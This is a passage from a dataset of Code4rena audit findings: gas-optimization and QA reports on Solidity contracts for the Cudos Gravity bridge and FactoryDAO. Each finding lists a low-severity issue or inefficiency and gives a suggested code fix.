Concept\n```solidity\nGravity.sol::128 => for (uint256 i = 0; i < _users.length; i++) {\nGravity.sol::231 => uint256 cumulativePower = 0;\nGravity.sol::233 => for (uint256 i = 0; i < _currentValidators.length; i++) {\nGravity.sol::263 => for (uint256 i = 0; i < _newValset.validators.length; i++) {\nGravity.sol::453 => for (uint256 i = 0; i < _amounts.length; i++) {\nGravity.sol::568 => for (uint256 i = 0; i < _args.transferAmounts.length; i++) {\nGravity.sol::579 => for (uint256 i = 0; i < _args.feeAmounts.length; i++) {\nGravity.sol::659 => uint256 cumulativePower = 0;\nGravity.sol::660 => for (uint256 i = 0; i < _powers.length; i++) {\n```\n#### Recommendation\nRemove explicit zero initialization.\n\n### [G-06] `++i` costs less gas compared to `i++` or `i += 1`\n#### Impact\n`++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.\n#### Proof of Concept\n```solidity\nGravity.sol::128 => for (uint256 i = 0; i < _users.length; i++) {\nGravity.sol::233 => for (uint256 i = 0; i < _currentValidators.length; i++) {\nGravity.sol::263 => for (uint256 i = 0; i < _newValset.validators.length; i++) {\nGravity.sol::453 => for (uint256 i = 0; i < _amounts.length; i++) {\nGravity.sol::568 => for (uint256 i = 0; i < _args.transferAmounts.length; i++) {\nGravity.sol::579 => for (uint256 i = 0; i < _args.feeAmounts.length; i++) {\nGravity.sol::660 => for (uint256 i = 0; i < _powers.length; i++) {\n```\n#### Recommendation\nUse `++i` instead of `i++` to increment the value of an uint variable.\nSame thing for `--i` and `i--`.\n\n### [G-07] State variables that could be declared `constant`\n#### Impact\nConstant state variables should be declared constant to save gas.\n#### Proof of Concept\n```solidity\nCosmosToken.sol::5 => uint256 MAX_UINT = 2**256 - 1; // @audit make constant, saves gas.\n```\n#### Recommendation\nAdd the `constant` attributes to state variables that never change.\n\n#### Tools used\nc4udit, manual, slither",
    "dataSource": {
      "name": "code-423n4/2022-05-cudos-findings",
      "repo": "https://github.com/code-423n4/2022-05-cudos-findings",
      "url": "https://github.com/code-423n4/2022-05-cudos-findings/issues/132"
    }
  },
  {
    "title": "QA Report",
    "body": "# Summary of Findings for Low / Non-Critical issues\n\n* L-01 : Direct usage of ecrecover allows signature malleability \n* L-02 : SafeMath library is not always used in Gravity.sol\n* L-03 : Input validation of constructor parameters in Gravity.sol\n* L-04 : Use structure for signature\n* L-05 : Use constant for MAX_UINT \n\n## Details L-01 \n### Title : Direct usage of ecrecover allows signature malleability \n\n### Impact\nThe verifySig function of Gravity.sol calls the Solidity ecrecover function directly to verify the given signatures. However, the ecrecover EVM opcode allows malleable (non-unique) signatures and thus is susceptible to replay attacks.\n\nAlthough a replay attack seems not possible here since the nonce is increased each time, ensuring the signatures are not malleable is considered a best practice (and so is checking _signer != address(0), where address(0) means an invalid signature).\n\n### Proof of Concept\nContract :  Gravity.sol\nFunction : verifySig\n\n### Recommended Mitigation Steps\nUse the recover function from OpenZeppelin's ECDSA library for signature verification.\n\n\n## Details L-02 \n### Title : SafeMath library is not always used in Gravity.sol\n\n### Impact\nSafeMath library functions are not always used in the Gravity contract's arithmetic operations, which could cause integer underflow/overflows. Using SafeMath is considered a best practice that could completely prevent underflow/overflows and increase code consistency.\n\n### Proof of Concept\nContract :  Gravity.sol \nFunction : checkValidatorSignatures(...)\n  line 244 :   cumulativePower = cumulativePower + _currentPowers[i];\n\nFunction : constructor(...)\n  line 661 :   cumulativePower = cumulativePower + _powers[i];\n\n### Recommended Mitigation Steps\n\nConsider using the SafeMath library functions in the above mentioned lines of code.\n\n\n## Details L-03\n### Title : Input validation of constructor parameters in Gravity.sol\n\nIn the constructor additional check for _gravityId not to be null, and  _powerThreshold to be greater than 0,  can be added.\n\n### Proof of Concept\nContract : Gravity.sol\nFunction : constructor (...)\n\n### Recommended Mitigation Steps\nAdd appropriate require statement checking the input parameters mentioned above for the constructor\n\n\n## Details L-04\n### Title : Use structure for signature\n\nAdd a struct \"Signature\" which contains the v, r, and s components of a validator signature, This is a more compact encoding and\nremoves the possibility of mismatched signature array lenghts.\n\nFurthermore this reduces our total stack usage and allows us to declare validator sets and signatures to be of type 'calldata' universally.\n\n// This represents a validator signature\nstruct Signature {\n\tuint8 v;\n\tbytes32 r;\n\tbytes32 s;\n}\n\n### Proof of Concept\nContract : Gravity.sol \nFunctions : testCheckValidatorSignatures, verifySig, checkValidatorSignatures, updateValset, submitBatch, submitLogicCall\n\n### Recommended Mitigation Steps\n\nRefer to the code fix in https://github.com/Gravity-Bridge/Gravity-Bridge/commit/2bd0837b3ef52fe2f2abc705fc72f371e047c857\n\n## Details L-05\n### Title : Use constant for MAX_UINT \n\nUse constants to improve security by preventing assignments and increase performance by explicitly flagging this constant.\n\n### Proof of Concept\nContract :  CosmosERC20  in CosmosToken.sol \nLine 5 : uint256 MAX_UINT = 2**256 - 1;\n\n### Recommended Mitigation Steps\nChange the above line to \n\nuint256 constant MAX_UINT = 2**256 - 1;\n",
    "dataSource": {
      "name": "code-423n4/2022-05-cudos-findings",
      "repo": "https://github.com/code-423n4/2022-05-cudos-findings",
      "url": "https://github.com/code-423n4/2022-05-cudos-findings/issues/130"
    }
  },
  {
    "title": "QA Report",
    "body": "# Interfaces\n\n[IERC20.sol](https://github.com/code-423n4/2022-05-factorydao/blob/main/interfaces/IERC20.sol), [IERC721.sol](https://github.com/code-423n4/2022-05-factorydao/blob/main/interfaces/IERC721.sol), and [IERC721Receiver.sol](https://github.com/code-423n4/2022-05-factorydao/blob/main/interfaces/IERC721Receiver.sol) seem to have very similar implementations with openzeppelin's counterparts.\n- IERC20: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol\n- IERC721: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/IERC721.sol\n- IERC721Receiver: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/IERC721Receiver.sol\n\nIt is worth using the latest versions if possible.\n\n---\n\n# IERC721.sol\n\n## Lack of implementation of IERC165\n\nIERC721.sol in the FactoryDAO project does not implement IERC165.\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/interfaces/IERC721.sol#L8\n\n\nHere is an implementation of the IERC721 of openzeppelin.\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/IERC721.sol\n\n```\ninterface IERC721 is IERC165 {\n```\n\nIt may be worth adding the support of the interface of ERC165 in this project. [Reference](https://docs.openzeppelin.com/contracts/4.x/api/utils#IERC165) \n\n\n---\n\n## Styles of functions' arguments are not consistent  \n\nArguments in the functions used in [IERC721](https://github.com/code-423n4/2022-05-factorydao/blob/main/interfaces/IERC721.sol) have ``type variableName``. However, following two parts are exceptions. \n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/interfaces/IERC721.sol#L104\n\n```\nfunction setApprovalForAll(address operator, bool _approved) external;\n```\n\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/interfaces/IERC721.sol#L111\n\n```\nfunction isApprovedForAll(address, address) external view returns (bool);\n```\n\nIf this peoject keeps using the copy of IERC721, it is worth fixing the above style inconsistency as follows.\n\n\n```\nfunction setApprovalForAll(address operator, bool approved) external;\n```\n\n```\nfunction isApprovedForAll(address owner, address operator) external view returns (bool);\n```\n\n---\n# PermissionlessBasicPoolFactory.sol\n\n## Consider adding address(0) check on _globalBeneficiary at constructor\n\n_globalBeneficiary variable does not have any address(0) check. \n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L76\n\n```\nconstructor(address _globalBeneficiary, uint _globalTaxPerCapita) {\n    globalBeneficiary = _globalBeneficiary;\n    globalTaxPerCapita = _globalTaxPerCapita;\n}\n```\n\nThere is no way to update the state variable globalBeneficiary, so it is worth considering adding address(0) check.\n\n```\nconstructor(address _globalBeneficiary, uint _globalTaxPerCapita) {\n    require(_globalBeneficiary != address(0), \"...\");\n    globalBeneficiary = _globalBeneficiary;\n    globalTaxPerCapita = _globalTaxPerCapita;\n}\n```\n\n---\n\n## rewardsWeiPerSecondPerToken and rewardTokenAddresses can be empty array at addPool\n\naddPool receives rewardsWeiPerSecondPerToken and rewardTokenAddresses array.\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L92-L102\n\n```\nfunction addPool (\n    uint startTime,\n    uint maxDeposit,\n    uint[] memory rewardsWeiPerSecondPerToken,\n    uint programLengthDays,\n    address depositTokenAddress,\n    address excessBeneficiary,\n    address[] memory rewardTokenAddresses,\n    bytes32 ipfsHash,\n    bytes32 name\n) external {\n```\n\nIt is possible that user can add empty array on rewardsWeiPerSecondPerToken and rewardTokenAddresses. In this case, the pool does not do anything. If this is not expected, it is worth adding the empty array check at addPool function.\n\n```\nfunction addPool (\n    uint startTime,\n    uint maxDeposit,\n    uint[] memory rewardsWeiPerSecondPerToken,\n    uint programLengthDays,\n    address depositTokenAddress,\n    address excessBeneficiary,\n    address[] memory rewardTokenAddresses,\n    bytes32 ipfsHash,\n    bytes32 name\n) external {\n    require(rewardsWeiPerSecondPerToken.length != 0, \"rewardsWeiPerSecondPerToken cannot be empty\");\n```\n\n---\n\n## withdrawTaxes function does not have event\n\nwithdrawTaxes function does not have event emitted while withdrawExcessRewards function does have ``ExcessRewardsWithdrawn`` emission.\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L261-L272\n\nFor the consistency, withdrawTaxes should have the event emitted.\n\n\n\n\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-factorydao-findings",
      "repo": "https://github.com/code-423n4/2022-05-factorydao-findings",
      "url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/280"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# PermissionlessBasicPoolFactory.sol\n\n## Argument checks should happen before the logic starts at addPool function\n\nThere are some argument checks at addPool function.\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L112\n\n```\nfunction addPool (\n    ...\n) external {\n    Pool storage pool = pools[++numPools];\n    ...\n    pool.taxPerCapita = globalTaxPerCapita;\n\n    require(rewardsWeiPerSecondPerToken.length == rewardTokenAddresses.length, 'Rewards and reward token arrays must be same length');\n```\n\nTo reduce the gas cost for the user for the failure case, it is worth adding the check at the start of the function.\n\n```\nfunction addPool (\n    ...\n) external {\n    require(rewardsWeiPerSecondPerToken.length == rewardTokenAddresses.length, 'Rewards and reward token arrays must be same length');\n\n    Pool storage pool = pools[++numPools];\n    ...\n    pool.taxPerCapita = globalTaxPerCapita;\n```\n\n---\n\n## Setting 0 is not needed at uint i variable at the for loop\n\nIn the for loop, ``uint i = 0`` is used but this is not needed. \n\n```\nfor (uint i = 0; i < rewardTokenAddresses.length; i++) {\n```\n\nIn this contract, following places have this behavior.\nhttps://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L115\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L141\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L168\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L224\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L249\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L266\n\nThe default value of uint is 0, so removing it can reduce the gas cost like this.\n\n```\nfor (uint i; i < rewardTokenAddresses.length; i++) {\n```\n\n---\n\n## Usage of ``success`` boolean flag can be optimized\n\n``success`` boolean flag is used in the for loop. If the transfer fails for any of the token, the operation will be reverted because of ``require(success, 'Token deposits failed')``. \n\n```\nbool success = true;\nuint amount;\nfor (uint i = 0; i < pool.rewardFunding.length; i++) {\n    amount = getMaximumRewards(poolId, i);\n    // transfer the tokens from pool-creator to this contract\n    success = success && IERC20(pool.rewardTokens[i]).transferFrom(msg.sender, address(this), amount);\n    // bookkeeping to make sure pools don't share tokens\n    pool.rewardFunding[i] += amount;\n}\nrequire(success, 'Token deposits failed');\n```\n\nIf the numbers of loop increase, this can consume gas cost for the failure operations which are not good behavior for users. It can use ``break`` in the for loop if success becomes false to reduce the operations of the for loop like this.\n\n```\nbool success = true;\nuint amount;\nfor (uint i = 0; i < pool.rewardFunding.length; i++) {\n    amount = getMaximumRewards(poolId, i);\n    // transfer the tokens from pool-creator to this contract\n    success = success && IERC20(pool.rewardTokens[i]).transferFrom(msg.sender, address(this), amount);\n    if (!success) {\n        break;\n    }\n    // bookkeeping to make sure pools don't share tokens\n    pool.rewardFunding[i] += amount;\n}\nrequire(success, 'Token deposits failed');\n```\n\nFollowing codes have the pattern mentioned above, and worth revisiting.\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L139-L148\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L222-L234\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L248-L254\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L265-L270\n\n---\n\n## Unchecked can be used to reduce the gas cost at deposit function\n\nIt is certain that ``pool.maximumDepositWei - pool.totalDepositsWei`` will not be underflown because of ``require(pool.totalDepositsWei < pool.maximumDepositWei, 'Maximum deposit already reached')``. \n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L185-L188\n\n```\nrequire(pool.totalDepositsWei < pool.maximumDepositWei, 'Maximum deposit already reached');\nif (pool.totalDepositsWei + amount > pool.maximumDepositWei) {\n    amount = pool.maximumDepositWei - pool.totalDepositsWei;\n}\n```\n\nThis part can be rewritten like this to reduce the gas cost by using unchecked.\n\n```\nrequire(pool.totalDepositsWei < pool.maximumDepositWei, 'Maximum deposit already reached');\nif (pool.totalDepositsWei + amount > pool.maximumDepositWei) {\n    unchecked {\n        amount = pool.maximumDepositWei - pool.totalDepositsWei;\n    }\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-factorydao-findings",
      "repo": "https://github.com/code-423n4/2022-05-factorydao-findings",
      "url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/279"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low\n\n### Missing parameter validations in `SpeedBumpPriceGate#addGate`\n\nCallers of `addGate` can create price gates with a zero price floor (allowing users to claim free tokens), and zero `priceIncreaseDenominator` (causing price calculation to revert with a divide by zero error).\n\n[`SpeedBumpPriceGate#addGate`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/SpeedBumpPriceGate.sol#L36-L45)\n\n```solidity\n\n    function addGate(uint priceFloor, uint priceDecay, uint priceIncrease, uint priceIncreaseDenominator, address beneficiary) external {\n        // prefix operator increments then evaluates\n        Gate storage gate = gates[++numGates];\n        gate.priceFloor = priceFloor;\n        gate.decayFactor = priceDecay;\n        gate.priceIncreaseFactor = priceIncrease;\n        gate.priceIncreaseDenominator = priceIncreaseDenominator;\n        gate.beneficiary = beneficiary;\n    }\n```\n\nSuggestion: Validate that `priceFloor` and `priceIncreaseDenominator` are nonzero.\n\n```solidity\n\n    function addGate(uint priceFloor, uint priceDecay, uint priceIncrease, uint priceIncreaseDenominator, address beneficiary) external {\n        require(priceFloor != 0, \"Price floor must be nonzero\");\n        require(priceIncreaseDenominator != 0, \"Denominator must be nonzero\");\n        // prefix operator increments then evaluates\n        Gate storage gate = gates[++numGates];\n        gate.priceFloor = priceFloor;\n        gate.decayFactor = priceDecay;\n        gate.priceIncreaseFactor = priceIncrease;\n        gate.priceIncreaseDenominator = priceIncreaseDenominator;\n        gate.beneficiary = beneficiary;\n    }\n```\n\n\n### `VoterID` token can be minted to the zero address\n\n`VoterID` tokens can be minted to the zero address in `VoterID#createIdentityFor`.\n\n[`VoterID#createIdentityFor`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L122-L147)\n\n```solidity\n    function createIdentityFor(address thisOwner, uint thisToken, string memory uri) public override {\n        require(msg.sender == _minter, 'Only minter may create identity');\n        require(owners[thisToken] == address(0), 'Token already exists');\n\n        // for getTokenByIndex below, 0 based index so we do it before incrementing numIdentities\n        allTokens[numIdentities] = thisToken;\n\n        // increment the number of identities\n        numIdentities = numIdentities + 1;\n\n        // two way mapping for enumeration\n        ownershipMapIndexToToken[thisOwner][balances[thisOwner]] = thisToken;\n        ownershipMapTokenToIndex[thisOwner][thisToken] = balances[thisOwner];\n\n        // set owner of new token\n        owners[thisToken] = thisOwner;\n        // increment balances for owner\n        balances[thisOwner] = balances[thisOwner] + 1;\n        uriMap[thisToken] = uri;\n        emit Transfer(address(0), thisOwner, thisToken);\n        emit IdentityCreated(thisOwner, thisToken);\n    }\n```\n\nSuggestion: validate `thisOwner` in `createIdentityFor`:\n\n```solidity\n    function createIdentityFor(address thisOwner, uint thisToken, string memory uri) public override {\n        require(msg.sender == _minter, 'Only minter may create identity');\n        require(owners[thisToken] == address(0), 'Token already exists');\n        require(thisOwner != address(0), 'ERC721: mint to the zero address');\n\n        // for getTokenByIndex below, 0 based index so we do it before incrementing numIdentities\n        allTokens[numIdentities] = thisToken;\n\n        // increment the number of identities\n        numIdentities = numIdentities + 1;\n\n        // two way mapping for enumeration\n        ownershipMapIndexToToken[thisOwner][balances[thisOwner]] = thisToken;\n        ownershipMapTokenToIndex[thisOwner][thisToken] = balances[thisOwner];\n\n        // set owner of new token\n        owners[thisToken] = thisOwner;\n        // increment balances for owner\n        balances[thisOwner] = balances[thisOwner] + 1;\n        uriMap[thisToken] = uri;\n        emit Transfer(address(0), thisOwner, thisToken);\n        emit IdentityCreated(thisOwner, thisToken);\n    }\n```\n\n### `VoterID` token can be minted to non-ERC721 receivers\n\n`VoterID` tokens can be minted to non-ERC721 receivers in `VoterID#createIdentityFor`.\n\n[`VoterID#createIdentityFor`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L122-L147)\n\n```solidity\n    function createIdentityFor(address thisOwner, uint thisToken, string memory uri) public override {\n        require(msg.sender == _minter, 'Only minter may create identity');\n        require(owners[thisToken] == address(0), 'Token already exists');\n\n        // for getTokenByIndex below, 0 based index so we do it before incrementing numIdentities\n        allTokens[numIdentities] = thisToken;\n\n        // increment the number of identities\n        numIdentities = numIdentities + 1;\n\n        // two way mapping for enumeration\n        ownershipMapIndexToToken[thisOwner][balances[thisOwner]] = thisToken;\n        ownershipMapTokenToIndex[thisOwner][thisToken] = balances[thisOwner];\n\n        // set owner of new token\n        owners[thisToken] = thisOwner;\n        // increment balances for owner\n        balances[thisOwner] = balances[thisOwner] + 1;\n        uriMap[thisToken] = uri;\n        emit Transfer(address(0), thisOwner, thisToken);\n        emit IdentityCreated(thisOwner, thisToken);\n    }\n```\n\nSuggestion: check `checkOnERC721Received` in `createIdentityFor`. This callback introduces a reentrancy vector, so take care to ensure callers of `createIdentityFor` use a reentrancy guard or follow checks-effects-interactions:\n\n```solidity\n    function createIdentityFor(address thisOwner, uint thisToken, string memory uri) public override {\n        require(msg.sender == _minter, 'Only minter may create identity');\n        require(owners[thisToken] == address(0), 'Token already exists');\n        require(thisOwner != address(0), 'ERC721: mint to the zero address');\n\n        // for getTokenByIndex below, 0 based index so we do it before incrementing numIdentities\n        allTokens[numIdentities] = thisToken;\n\n        // increment the number of identities\n        numIdentities = numIdentities + 1;\n\n        // two way mapping for enumeration\n        ownershipMapIndexToToken[thisOwner][balances[thisOwner]] = thisToken;\n        ownershipMapTokenToIndex[thisOwner][thisToken] = balances[thisOwner];\n\n        // set owner of new token\n        owners[thisToken] = thisOwner;\n        // increment balances for owner\n        balances[thisOwner] = balances[thisOwner] + 1;\n        uriMap[thisToken] = uri;\n\n        require(\n            checkOnERC721Received(address(0), thisOwner, thisToken, \"\"),\n            \"Identity: transfer to non ERC721Receiver implementer\"\n        );\n        emit Transfer(address(0), thisOwner, thisToken);\n        emit IdentityCreated(thisOwner, thisToken);\n    }\n```\n\n### `VoterID` ownership can be transferred to the zero address\n\nThe `owner` of `VoterID` can be intentionally or accidentally set to `address(0)`, which would permanently deny access to `ownerOnly` protected functions.\n\n[`VoterID.sol#L151-L155`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L151-L155)\n\n```solidity\n    function setOwner(address newOwner) external ownerOnly {\n        address oldOwner = _owner_;\n        _owner_ = newOwner;\n        emit OwnerUpdated(oldOwner, newOwner);\n    }\n```\n\nSuggestion: Validate that `newOwner` is not `address(0)` in `setOwner`:\n\n```solidity\n    function setOwner(address newOwner) external ownerOnly {\n        require(newOwner != address(0), 'New owner is the zero address');\n        address oldOwner = _owner_;\n        _owner_ = newOwner;\n        emit OwnerUpdated(oldOwner, newOwner);\n    }\n```\n\nAdditionally, consider implementing two-step ownership transfers.\n\n### Prefer two-step ownership transfers\n\nIf the `owner` of `VoterID` accidentally transfers ownership to an incorrect address, protected functions may become permanently inaccessible.\n\n[`VoterID.sol#L151-L155`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L151-L155)\n\n```solidity\n    function setOwner(address newOwner) external ownerOnly {\n        address oldOwner = _owner_;\n        _owner_ = newOwner;\n        emit OwnerUpdated(oldOwner, newOwner);\n    }\n```\n\nSuggestion: handle ownership transfers with two steps and two transactions. First, allow the current owner to propose a new owner address. Second, allow the proposed owner (and only the proposed owner) to accept ownership, and update the contract owner internally.\n\n### `balanceOf` does not revert on zero address query\n\nAccording to the ERC721 spec and the natspec comment in the code, `VoterID#balanceOf` should revert when called with the zero address, but it does not:\n\n[`VoterID.sol#L168-L175`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L168-L175)\n\n```solidity\n    /// @notice Count all NFTs assigned to an owner\n    /// @dev NFTs assigned to the zero address are considered invalid, and this\n    ///  function throws for queries about the zero address.\n    /// @param _address An address for whom to query the balance\n    /// @return The number of NFTs owned by `owner`, possibly zero\n    function balanceOf(address _address) external view returns (uint256) {\n        return balances[_address];\n    }\n```\n\nSuggestion: Validate that `_address` is not `address(0)` in `balanceOf`:\n\n```solidity\n    /// @notice Count all NFTs assigned to an owner\n    /// @dev NFTs assigned to the zero address are considered invalid, and this\n    ///  function throws for queries about the zero address.\n    /// @param _address An address for whom to query the balance\n    /// @return The number of NFTs owned by `owner`, possibly zero\n    function balanceOf(address _address) external view returns (uint256) {\n        require(_address != address(0), \"ERC721: balance query for the zero address\");\n        return balances[_address];\n    }\n```\n\n### Prefer `safeTransfer` and `safeTransferFrom` for ERC20 token transfers\n\nConsider using OpenZeppelin's [`SafeERC20`](https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#SafeERC20) library to handle edge cases in ERC20 token transfers. This prevents accidentally forgetting to check the return value, like the example in [`MerkleVesting#withdraw`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleVesting.sol#L169-L174).\n\nPotential changes:\n- [`PermissionlessBasicPoolFactory.sol#L144`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L144)\n- [`PermissionlessBasicPoolFactory.sol#L198`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L198)\n- [`PermissionlessBasicPoolFactory.sol#L230`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L230)\n- [`MerkleVesting.sol#L89`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleVesting.sol#L89)\n- [`MerkleResistor.sol#L121`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleResistor.sol#L121)\n- [`MerkleResistor.sol#L204`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleResistor.sol#L204)\n- [`MerkleDropFactory.sol#L77`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleDropFactory.sol#L77)\n- [`MerkleDropFactory.sol#L107`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleDropFactory.sol#L107)\n\n## QA/Noncritical\n\n### Move `require` check to top of function\n\nThe `require` check in `PermissionlessBasicPoolFactory#addPool` comes after several state changes. Consider moving it to the top of the function to follow the checks-effects-interactions pattern.\n\n[`PermissionlessBasicPoolFactory.sol#L112`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L111-L113)\n\n```solidity\n        require(rewardsWeiPerSecondPerToken.length == rewardTokenAddresses.length, 'Rewards and reward token arrays must be same length');\n```\n\n### Replace inline assembly with `account.code.length`\n\n`<address>.code.length` can be used in Solidity >= 0.8.0 to access an account's code size and check if it is a contract without inline assembly.\n\n[`VoterID#isContract`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L343-L349)\n\n```solidity\n    function isContract(address account) internal view returns (bool) {\n\n        uint256 size;\n        // solhint-disable-next-line no-inline-assembly\n        assembly { size := extcodesize(account) }\n        return size > 0;\n    }\n```\n\nSuggestion:\n\n```solidity\n    function isContract(address account) internal view returns (bool) {\n        return account.code.length != 0;\n    }\n```\n\n### `VoterID#transferFrom` does not distinguish nonexistent tokens from unapproved transfers\n\nUnlike other common ERC721 implementations, `VoterID` does not distinguish an attempt to transfer a nonexistent token from an unapproved transfer:\n\n[`VoterId#transferFrom`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L198-L201)\n\n```solidity\n    function transferFrom(address from, address to, uint256 tokenId) public {\n        require(isApproved(msg.sender, tokenId), 'Identity: Unapproved transfer');\n        transfer(from, to, tokenId);\n    }\n```\n\nConsider checking that a token exists in `isApproved` to distinguish attempts to transfer nonexistint tokens. (See OpenZeppelin [`ERC721#_isApprovedOrOwner`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/d4fb3a89f9d0a39c7ee6f2601d33ffbf30085322/contracts/token/ERC721/ERC721.sol#L232) for an example).\n\n### Emit events from privileged operations\n\nConsider adding events to protected functions that change contract state. This enables you to monitor off chain for suspicious activity, and allows end users to observe and trust changes to these parameters.\n\n- [`VoterId#setTokenURI`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L163)\n- [`MerkleIdentity#setManagement`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleIdentity.sol#L60)\n- [`MerkleIdentity#setTreeAdder`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleIdentity.sol#L67)\n- [`MerkleIdentity#setIpfsHash`](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/MerkleIdentity.sol#L75)\n\n### Incomplete natspec comment\n\nThe `@notice` natspec comment on `VoterID` is [incomplete](https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/VoterID.sol#L10).",
    "dataSource": {
      "name": "code-423n4/2022-05-factorydao-findings",
      "repo": "https://github.com/code-423n4/2022-05-factorydao-findings",
      "url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/275"
    }
  },
  {
    "title": "QA Report",
